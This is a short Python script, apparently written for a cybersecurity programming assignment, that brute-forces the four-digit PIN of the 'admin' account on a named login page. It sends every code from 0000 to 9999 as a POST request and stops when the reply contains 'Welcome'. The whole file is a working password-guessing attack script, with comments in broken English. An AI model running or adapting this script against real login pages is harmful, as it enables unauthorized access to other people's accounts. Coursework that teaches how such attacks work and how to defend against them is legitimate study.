# In the mention task Programming for Cyber security  (First Script is brute_force)


# import is the populer library in python that use to send HTTP requests  to the server then on the basis of that request  queury runs and check while  the suppose  password or email name is  exist or not in the database
import requests

# i add the url as given in your task u can also chnage according to your requirements simple here  on the basis of that url that brute attack is in action
url = "http://cyforsec.co.uk/login"

# the username we wannt to check like for suppose you can also set your name to check while your record is exist in the data base or not
username = "admin"

# here define the seperate function to perform brute force attack
def brute_force():
    # Its iterate through all possible 4-digit PIN codes  like (0000 to 9999)
    for code in range(10000):
        # here we manually we providing the format like Password should be four digits (4d)
        password = f"{code:04d}"

        # Sending  a POST request to the login URL with the username and current password
        response = requests.post(url, data={"username": username, "password": password})

        # here is the checking condition   "Welcome" or any success message
        # (Replace "Welcome" with the actual success message shown on the website)
        if "Welcome" in response.text:
            # If the success message is found, print the password and stop the function
            print(f"Password found: {password}")
            return password  # Return the correct password

    # If no  password    works  then in back requests  which is know return statement it display  print("Password not found.")
    print("Password not found.")
    return None  # Return NUll

# Check if this script is being run directly (not imported into another script)
if __name__ == "__main__":
    # Call the brute_force function to start the attack
    brute_force()
